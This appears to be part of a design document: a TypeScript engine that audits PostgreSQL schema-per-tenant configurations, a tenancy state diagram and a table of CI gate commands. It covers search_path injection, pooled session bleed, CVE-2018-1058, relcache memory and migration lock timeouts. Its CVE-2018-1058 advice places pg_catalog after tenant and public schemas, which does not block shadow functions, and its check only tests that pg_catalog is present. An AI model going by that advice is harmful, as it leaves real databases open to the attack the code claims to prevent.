This production guard engine audits multi-tenant schema-per-tenant configurations, inspects queries for dangerous unparameterized `SET search_path` calls, detects missing `SET LOCAL` in pooled environments, audits CVE-2018-1058 search path ordering, models backend relcache memory bloat, and verifies fleet DDL migration chunking.

```typescript
/**
 * AgenticDatabaseSchemaTenantGuardEngine
 * Industrial-grade verification engine for PostgreSQL Schema-per-Tenant invariants.
 */

export interface SchemaTenantAuditOptions {
  totalTenants: number;
  tablesPerTenant: number;
  indexesPerTenant: number;
  backendConnections: number;
  availableRamGb: number;
  poolMode: 'transaction' | 'session' | 'statement';
}

export interface SearchPathAuditResult {
  isSafe: boolean;
  violations: string[];
  recommendations: string[];
}

export interface RelcacheMemoryProjection {
  totalRelations: number;
  estimatedMbPerBackend: number;
  totalRelcacheGb: number;
  ramUtilizationPercentage: number;
  isOomHazard: boolean;
  crossoverRecommendation: 'SCHEMA_PER_TENANT' | 'ROW_LEVEL_SECURITY' | 'SILO_DATABASE_PER_TENANT';
}

export interface FleetMigrationPlan {
  totalSchemas: number;
  concurrencyWorkers: number;
  lockTimeoutMs: number;
  isMonolithicLoop: boolean;
}

export class AgenticDatabaseSchemaTenantGuardEngine {
  private static readonly TENANT_ID_PATTERN = /^[a-z0-9_]{1,63}$/;
  private static readonly SESSION_SET_PATTERN = /\bSET\s+(?:SESSION\s+)?search_path\s*=/i;
  private static readonly LOCAL_SET_PATTERN = /\bSET\s+LOCAL\s+search_path\s*=/i;
  private static readonly STRING_INTERPOLATION_PATTERN = /SET\s+(?:LOCAL\s+)?search_path\s*=\s*['"`]?\s*\$\{[^}]+\}/i;
  private static readonly DANGEROUS_CONCAT_PATTERN = /format\s*\(\s*['"]SET\s+search_path/i;

  /**
   * Validates a tenant identifier against SQL injection and syntax constraints.
   */
  public static validateTenantId(tenantId: string): boolean {
    return this.TENANT_ID_PATTERN.test(tenantId);
  }

  /**
   * Audits a SQL query or code snippet for dangerous search_path switching patterns.
   */
  public static auditSearchPathUsage(
    sqlQuery: string,
    isInsideTransaction: boolean,
    isTransactionPooling: boolean
  ): SearchPathAuditResult {
    const violations: string[] = [];
    const recommendations: string[] = [];

    // Check 1: String interpolation vulnerability
    if (this.STRING_INTERPOLATION_PATTERN.test(sqlQuery)) {
      violations.push(
        'SQL INJECTION HAZARD: search_path dynamically interpolated using template literals without sanitization.'
      );
      recommendations.push(
        'Validate tenant identifier against ^[a-z0-9_]{1,63}$ and use quote_ident() escaping.'
      );
    }

    // Check 2: Session-level SET in Transaction Pooling
    if (isTransactionPooling && this.SESSION_SET_PATTERN.test(sqlQuery) && !this.LOCAL_SET_PATTERN.test(sqlQuery)) {
      violations.push(
        'CROSS-TENANT SESSION BLEED: Session-level SET search_path detected in transaction pooling mode. Subsequent requests on this connection will leak tenant data.'
      );
      recommendations.push(
        'Always use SET LOCAL search_path inside an explicit BEGIN ... COMMIT block.'
      );
    }

    // Check 3: SET LOCAL outside transaction
    if (this.LOCAL_SET_PATTERN.test(sqlQuery) && !isInsideTransaction) {
      violations.push(
        'INEFFECTIVE SET LOCAL: SET LOCAL search_path executed outside an active transaction. PostgreSQL will issue a warning and revert immediately.'
      );
      recommendations.push(
        'Wrap SET LOCAL search_path within an explicit transaction (BEGIN ... COMMIT).'
      );
    }

    // Check 4: CVE-2018-1058 Defense (search_path ordering)
    if (this.LOCAL_SET_PATTERN.test(sqlQuery) || this.SESSION_SET_PATTERN.test(sqlQuery)) {
      const lower = sqlQuery.toLowerCase();
      if (!lower.includes('pg_catalog')) {
        violations.push(
          'CVE-2018-1058 RISK: search_path does not explicitly declare pg_catalog. Malicious schemas can define shadow functions to hijack administrative queries.'
        );
        recommendations.push(
          'Include pg_catalog explicitly in search_path (e.g. SET LOCAL search_path = tenant_xxx, public, pg_catalog, pg_temp;).'
        );
      }
    }

    return {
      isSafe: violations.length === 0,
      violations,
      recommendations,
    };
  }

  /**
   * Calculates relcache memory projections and provides architectural crossover recommendations.
   */
  public static calculateRelcacheProjection(
    options: SchemaTenantAuditOptions
  ): RelcacheMemoryProjection {
    const relationsPerTenant = options.tablesPerTenant + options.indexesPerTenant;
    const totalRelations = options.totalTenants * relationsPerTenant;

    // Estimated memory per relation descriptor: ~3.5 KB (RelationData + TupleDesc + IndexDescs)
    const kbPerRelation = 3.5;
    const estimatedMbPerBackend = (totalRelations * kbPerRelation) / 1024;
    const totalRelcacheGb = (estimatedMbPerBackend * options.backendConnections) / 1024;
    const ramUtilizationPercentage = (totalRelcacheGb / options.availableRamGb) * 100;

    const isOomHazard = ramUtilizationPercentage > 40.0 || totalRelations > 100000;

    let crossoverRecommendation: 'SCHEMA_PER_TENANT' | 'ROW_LEVEL_SECURITY' | 'SILO_DATABASE_PER_TENANT';
    if (options.totalTenants > 1000 || totalRelations > 50000) {
      crossoverRecommendation = 'ROW_LEVEL_SECURITY';
    } else {
      crossoverRecommendation = 'SCHEMA_PER_TENANT';
    }

    return {
      totalRelations,
      estimatedMbPerBackend: Math.round(estimatedMbPerBackend * 100) / 100,
      totalRelcacheGb: Math.round(totalRelcacheGb * 100) / 100,
      ramUtilizationPercentage: Math.round(ramUtilizationPercentage * 100) / 100,
      isOomHazard,
      crossoverRecommendation,
    };
  }

  /**
   * Validates a fleet DDL migration plan to prevent head-of-line blocking and connection starvation.
   */
  public static auditFleetMigrationPlan(plan: FleetMigrationPlan): {
    isSafe: boolean;
    errors: string[];
    warnings: string[];
  } {
    const errors: string[] = [];
    const warnings: string[] = [];

    if (plan.isMonolithicLoop) {
      errors.push(
        'MONOLITHIC DDL BLOCKADE: Running migrations across all schemas in a single transaction will hold AccessExclusiveLocks, blocking queries across all tenants.'
      );
    }

    if (plan.lockTimeoutMs > 2000) {
      errors.push(
        `DANGEROUS LOCK TIMEOUT: lock_timeout is ${plan.lockTimeoutMs}ms. Must be <= 2000ms to prevent connection pool exhaustion during lock waits.`
      );
    }

    if (plan.concurrencyWorkers > 8) {
      warnings.push(
        `HIGH MIGRATION CONCURRENCY: Concurrency of ${plan.concurrencyWorkers} workers may saturate WAL write bandwidth and spike replica lag.`
      );
    }

    if (plan.totalSchemas > 1000 && plan.concurrencyWorkers === 1) {
      warnings.push(
        `SERIAL MIGRATION DRAG: Migrating ${plan.totalSchemas} schemas serially will take hours. Consider chunked parallel execution (4-8 workers).`
      );
    }

    return {
      isSafe: errors.length === 0,
      errors,
      warnings,
    };
  }
}
```

---

## 6. Six-State Schema Tenancy Governance Finite State Machine (FSM)

```
       ┌───────────────────────────────┐
       │       0. UNINITIALIZED        │
       └──────────────┬────────────────┘
                      │ Tenant Registration & Input Sanitization
                      ▼
       ┌───────────────────────────────┐
       │     1. SCHEMA_PROVISIONED     │◄─────────────────┐
       └──────────────┬────────────────┘                  │
                      │ Explicit BEGIN & Context Binding  │ Rollback / Commit
                      ▼                                   │
       ┌───────────────────────────────┐                  │
       │       2. TENANT_BOUND         │                  │
       └──────────────┬────────────────┘                  │
                      │ SET LOCAL search_path = tenant... │
                      ▼                                   │
       ┌───────────────────────────────┐                  │
       │    3. TRANSACTION_SCOPED      ├──────────────────┘
       └──────┬─────────────────┬──────┘
              │                 │ Fleet DDL Event
              │                 ▼
              │        ┌───────────────────────────────┐
              │        │      4. MIGRATING_FLEET       │
              │        └────────┬──────────────────────┘
              │                 │ Discrete Per-Schema Commits
              ▼                 ▼
       ┌───────────────────────────────┐
       │     5. MAINTENANCE_VACUUM     │
       └───────────────────────────────┘
```

| State | Invariant Condition | Entry Action | Exit Action | Failure Mode & Remediation |
| :--- | :--- | :--- | :--- | :--- |
| **0. UNINITIALIZED** | No tenant context bound | Validate identifier regex `^[a-z0-9_]{1,63}$` | Reject non-conforming tenant IDs | Attacker SQL injection attempt; throw 400 Bad Request |
| **1. SCHEMA_PROVISIONED** | Schema created in `pg_namespace` | Create schema with authorization `postgres` | Restrict privileges from PUBLIC | CVE-2018-1058 exposure; revoke PUBLIC create on public |
| **2. TENANT_BOUND** | Connection checked out from pool | Verify `pool_mode = transaction` | Issue explicit `BEGIN` | Session bleed hazard; enforce connection wrapper |
| **3. TRANSACTION_SCOPED** | Isolation strictly bounded | `SET LOCAL search_path = quote_ident(...)` | Issue `COMMIT` or `ROLLBACK` | Lock timeout; auto-rollback and return clean connection |
| **4. MIGRATING_FLEET** | DDL partitioned across schemas | Enforce `lock_timeout <= 2000ms` | Commit discrete chunk transactions | Head-of-line lock stall; retry with exponential jitter |
| **5. MAINTENANCE_VACUUM** | Relcache & catalog bloat bounded | Monitor `pg_class` dead tuples & XID age | Alert if `age(datfrozenxid) > 200M` | Autovacuum starvation; boost workers and cost limits |

---

## 7. Machine-Verifiable Definition of Done (DoD) CI Gates Matrix

| DoD CI Gate | Verification Target | Automated Machine-Verifiable Assertion Command | Production Pass Criteria |
| :--- | :--- | :--- | :--- |
| **Gate 1: Static Search Path Injection Gate** | Application Code AST & SQL queries | `! git grep -E "SET\s+(SESSION\s+)?search_path\s*=\s*['\"\`]?\s*\\$\{"` | **Zero** unparameterized string interpolations in `SET search_path` statements |
| **Gate 2: PgBouncer Session Bleed Gate** | Transactional Scoping in Poolers | `! git grep -E "\bSET\s+(SESSION\s+)?search_path\s*=" -- ':!*test*' ':!*migration*'` | **100%** of runtime tenant switches use `SET LOCAL search_path` |
| **Gate 3: CVE-2018-1058 Path Ordering Gate** | Explicit `pg_catalog` in search path | `git grep -E "SET LOCAL search_path" \| grep -v "pg_catalog"` | **Zero** occurrences of search_path omitting explicit `pg_catalog` |
| **Gate 4: Fleet DDL Chunking & Timeout Gate** | Migration Scripts & Orchestrators | `git grep -E "ALTER TABLE" migrations/ \| grep -v "lock_timeout"` | **100%** of DDL migration scripts enforce `lock_timeout <= 2000ms` |
| **Gate 5: Relcache Catalog Scale Bound Gate** | PostgreSQL System Catalog | `psql -c "SELECT count(*) FROM pg_namespace WHERE nspname LIKE 'tenant_%';"` | Total tenant schemas per database instance **$\le 1,000$** |
| **Gate 6: Autovacuum Wraparound Age Gate** | Transaction ID Horizon | `psql -c "SELECT max(age(datfrozenxid)) FROM pg_database;"` | Maximum catalog transaction age **$< 200,000,000$** |
